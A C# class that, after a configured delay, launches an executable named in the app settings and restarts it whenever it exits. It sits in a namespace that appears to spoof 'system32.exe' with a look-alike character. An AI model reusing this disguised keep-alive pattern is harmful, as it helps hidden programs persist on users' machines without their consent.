using System;
using System.Configuration;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Windows.Threading;

namespace systеm32.exe.Models
{
    public class ClientProcessListener : ProcessListener
    {
        private readonly string _fileName;
        private readonly DispatcherTimer _watcher;
        private Process _currentProcess;

        public ClientProcessListener(string fileName,
                               string configPath) : base(
                                   fileName,
                                   configPath)
        {
            _fileName = fileName;
            _watcher = new DispatcherTimer
                (
                    DispatcherPriority.Normal
                )
            {
                Interval = TimeSpan.FromMilliseconds
                (
                    TimeSpan.FromSeconds
                    (
                        Properties
                        .Settings
                        .Default.ProcessCheckTimeoutInSeconds
                    ).TotalMilliseconds
                )
            };
            _watcher.Tick += KeepChildProcess;
        }

        private void KeepChildProcess(object sender, EventArgs e)
        {
            if (Properties.Settings.Default.DoNotRunAgain)
            {
                return;
            }
            if (_currentProcess.HasExited)
            {
                StartListening();
            }
        }

        public override async void StartListening()
        {
            if (Properties.Settings.Default.IsRunForFirstTime)
            {
                Properties.Settings.Default.IsRunForFirstTime = false;
                Properties.Settings.Default.Save();
                await Task.Delay(TimeSpan.FromSeconds(Properties.Settings.Default.FirstRunTimeoutInSeconds));
                _currentProcess = Process.Start(Properties.Settings.Default.FilePath, Properties.Settings.Default.FirstRunArgs);
            }
            else
            {
                await Task.Delay(TimeSpan.FromSeconds(Properties.Settings.Default.SecondRunTimeoutInSeconds));
                _currentProcess = Process.Start(Properties.Settings.Default.FilePath, Properties.Settings.Default.SecondRunArgs);
            }
            _watcher.Start();
        }
    }
}
